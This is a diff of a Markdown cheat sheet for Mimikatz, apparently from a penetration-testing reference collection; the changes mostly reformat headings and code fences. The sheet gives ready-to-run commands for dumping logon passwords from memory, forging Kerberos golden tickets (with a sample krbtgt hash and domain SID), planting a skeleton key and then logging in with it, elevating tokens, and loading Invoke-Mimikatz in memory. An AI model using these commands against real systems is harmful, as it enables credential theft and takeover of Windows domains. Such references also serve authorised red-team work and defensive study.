@@ -2,43 +2,53 @@
 
 ![Data in memory](http://adsecurity.org/wp-content/uploads/2014/11/Delpy-CredentialDataChart.png)
 
-## Mimikatz basic
+## Mimikatz - Execute commands
+
 Only one command
-```bash
+
+```powershell
 PS C:\temp\mimikatz> .\mimikatz "privilege::debug" "sekurlsa::logonpasswords" exit
 ```
 
 Mimikatz console (multiple commands)
-```bash
+
+```powershell
 PS C:\temp\mimikatz> .\mimikatz
 mimikatz # privilege::debug
 mimikatz # sekurlsa::logonpasswords
 mimikatz # sekurlsa::wdigest
+```
 
+## Mimikatz - Extract passwords
+
+```powershell
 mimikatz_command -f sekurlsa::logonPasswords full
 mimikatz_command -f sekurlsa::wdigest
 ```
 
-Mimikatz Golden ticket
-```
-.\mimikatz kerberos::golden /admin:ADMIINACCOUNTNAME /domain:DOMAINFQDN /id:ACCOUNTRID /sid:DOMAINSID /krbtgt:KRBTGTPASSWORDHASH /ptt
+## Mimikatz Golden ticket
 
+```powershell
+.\mimikatz kerberos::golden /admin:ADMINACCOUNTNAME /domain:DOMAINFQDN /id:ACCOUNTRID /sid:DOMAINSID /krbtgt:KRBTGTPASSWORDHASH /ptt
+```
+
+```powershell
 .\mimikatz "kerberos::golden /admin:DarthVader /domain:rd.lab.adsecurity.org /id:9999 /sid:S-1-5-21-135380161-102191138-581311202 /krbtgt:13026055d01f235d67634e109da03321 /startoffset:0 /endin:600 /renewmax:10080 /ptt" exit
 ```
 
-Mimikatz Skeleton key
-```
+## Mimikatz Skeleton key
+
+```powershell
 privilege::debug
 misc::skeleton
-
 # map the share
 net use p: \\WIN-PTELU2U07KG\admin$ /user:john mimikatz
 # login as someone
 rdesktop 10.0.0.2:3389 -u test -p mimikatz -d pentestlab
 ```
 
-
 ## Mimikatz commands
+
 | Command |Definition|
 |:----------------:|:---------------|
 | CRYPTO::Certificates|list/export certificates|
@@ -64,16 +74,18 @@ rdesktop 10.0.0.2:3389 -u test -p mimikatz -d pentestlab
 |TOKEN::Elevate | impersonate a token. Used to elevate permissions to SYSTEM (default) or find a domain admin token on the box|
 |TOKEN::Elevate /domainadmin | impersonate a token with Domain Admin credentials.
 
-
-
 ## Powershell Mimikatz
+
 Mimikatz in memory (no binary on disk) with :
- - [Invoke-Mimikatz](https://raw.githubusercontent.com/PowerShellEmpire/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1) from PowerShellEmpire
- - [Invoke-Mimikatz](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1) from PowerSploit
+
+- [Invoke-Mimikatz](https://raw.githubusercontent.com/PowerShellEmpire/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1) from PowerShellEmpire
+- [Invoke-Mimikatz](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1) from PowerSploit
 
 More informations can be grabbed from the Memory with :
- - [Invoke-Mimikittenz](https://raw.githubusercontent.com/putterpanda/mimikittenz/master/Invoke-mimikittenz.ps1)
+
+- [Invoke-Mimikittenz](https://raw.githubusercontent.com/putterpanda/mimikittenz/master/Invoke-mimikittenz.ps1)
 
 ## Thanks to
- * [Unofficial Guide to Mimikatz & Command Reference](https://adsecurity.org/?page_id=1821)
- * [Skeleton Key](https://pentestlab.blog/2018/04/10/skeleton-key/)
+
+- [Unofficial Guide to Mimikatz & Command Reference](https://adsecurity.org/?page_id=1821)
+- [Skeleton Key](https://pentestlab.blog/2018/04/10/skeleton-key/)
